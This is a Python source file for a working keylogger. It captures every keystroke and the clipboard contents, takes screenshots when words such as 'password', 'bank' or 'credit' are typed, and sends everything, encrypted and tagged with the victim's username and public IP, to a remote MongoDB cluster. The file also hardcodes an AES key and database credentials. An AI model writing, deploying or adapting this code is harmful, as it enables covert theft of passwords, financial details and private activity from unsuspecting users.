import time
import threading
import pymongo
import pyperclip
import base64
import requests
import getpass
import pyautogui
from Crypto.Cipher import AES
from pynput import keyboard
import io
from datetime import datetime, timezone, timedelta


# ------------------------------
# Configuration Constants
# ------------------------------
AES_KEY = bytes.fromhex("82d5d6060dff58f5875d520a6202b5384cfba4779a9db4e9c59ca3bce444a53e")
MONGO_URI = "mongodb+srv://root:root@cluster0.m8lbp.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
SENSITIVE_WORDS = ["bank", "password", "login", "credit"]

# ------------------------------
# Database Setup
# ------------------------------
client = pymongo.MongoClient(MONGO_URI)
db = client["keylogger2_db"]
logs_collection = db["logs"]
screenshots_collection = db["screenshots"]
clipboard_collection = db["clipboard_logs"]

# ------------------------------
# System Information
# ------------------------------
USERNAME = getpass.getuser()

def get_public_ip():
    try:
        return requests.get("https://api64.ipify.org?format=json").json().get("ip", "Unknown IP")
    except Exception:
        return "Unknown IP"

USER_IP = get_public_ip()

# ------------------------------
# Encryption Functions
# ------------------------------
def encrypt_data(data: str) -> str:
    cipher = AES.new(AES_KEY, AES.MODE_GCM)
    ciphertext, tag = cipher.encrypt_and_digest(data.encode("utf-8"))
    return base64.b64encode(cipher.nonce + tag + ciphertext).decode("utf-8")

def decrypt_data(enc_text: str) -> str:
    try:
        raw = base64.b64decode(enc_text)
        nonce, tag, ctext = raw[:16], raw[16:32], raw[32:]
        cipher = AES.new(AES_KEY, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ctext, tag).decode("utf-8")
    except Exception:
        return ""

# ------------------------------
# Utility: Get Correct Local Timestamp with Milliseconds
# ------------------------------
from datetime import datetime

def get_local_timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]  # ✅ Stores as a formatted string




# ------------------------------
# Screenshot Capture
# ------------------------------
def capture_screenshot():
    try:
        screenshot = pyautogui.screenshot()
        buffer = io.BytesIO()
        screenshot.save(buffer, format="PNG")
        img_bytes = buffer.getvalue()

        encrypted_screenshot = encrypt_data(base64.b64encode(img_bytes).decode())
        screenshots_collection.insert_one({
            "ip": USER_IP,
            "user": USERNAME,
            "screenshot": encrypted_screenshot,
            "timestamp": get_local_timestamp()  # ✅ Store local time in MongoDB
        })
        print(f"[SCREENSHOT] Captured at {get_local_timestamp()}")
    except Exception as e:
        print(f"[ERROR] Screenshot failed: {e}")

# ------------------------------
# Clipboard Logger
# ------------------------------
def log_clipboard():
    last_clipboard = ""
    while True:
        try:
            content = pyperclip.paste().strip()
            if content and content != last_clipboard:
                clipboard_collection.insert_one({
                    "ip": USER_IP,
                    "user": USERNAME,
                    "clipboard": encrypt_data(content),
                    "timestamp": get_local_timestamp()  # ✅ Store local time
                })
                last_clipboard = content
        except Exception as e:
            print(f"[ERROR] Clipboard logging failed: {e}")
        time.sleep(5)

# ------------------------------
# Keystroke Logging (Each Keystroke Logged Separately)
# ------------------------------
keystroke_batch = []
batch_lock = threading.Lock()

def on_press(key):
    global keystroke_batch
    try:
        if key == keyboard.Key.backspace:
            keystroke = "[BACKSPACE]"
        elif key == keyboard.Key.enter:
            keystroke = "[ENTER]"
        elif key == keyboard.Key.space:
            keystroke = " "
        elif hasattr(key, 'char') and key.char is not None:
            keystroke = key.char
        else:
            keystroke = f"[{key}]"

        timestamp = get_local_timestamp()  # ✅ Correct timestamp format with local timezone

        # Insert one document per keystroke
        doc = {
            "ip": USER_IP,
            "user": USERNAME,
            "keystroke": encrypt_data(keystroke),
            "timestamp": timestamp  # ✅ Store timestamp as datetime object
        }
        logs_collection.insert_one(doc)
        print(f"[LOG] Key: {keystroke} at {timestamp}")

        # Append keystroke to local batch (for checking sensitive words)
        with batch_lock:
            keystroke_batch.append(keystroke)

    except Exception as e:
        print(f"[ERROR] Keystroke logging failed: {e}")

# ------------------------------
# Batch Processing for Sensitive Word Detection
# ------------------------------
def analyze_keystroke_batch():
    global keystroke_batch
    while True:
        time.sleep(3)  # Check every 3 seconds
        with batch_lock:
            if not keystroke_batch:
                continue  # Skip if batch is empty
            typed_text = "".join(keystroke_batch).lower()
            keystroke_batch = []  # Clear batch after analysis

        # Check for sensitive words in full typed text
        if any(word in typed_text for word in SENSITIVE_WORDS):
            print(f"[ALERT] Sensitive word detected in batch: {typed_text}")
            threading.Thread(target=capture_screenshot, daemon=True).start()

# ------------------------------
# Start Keylogger
# ------------------------------
if __name__ == "__main__":
    threading.Thread(target=log_clipboard, daemon=True).start()
    threading.Thread(target=analyze_keystroke_batch, daemon=True).start()

    try:
        with keyboard.Listener(on_press=on_press) as listener:
            print("[INFO] Keylogger started. Press CTRL+C to stop.")
            listener.join()
    except KeyboardInterrupt:
        print("[INFO] Stopping keylogger...")
        client.close()
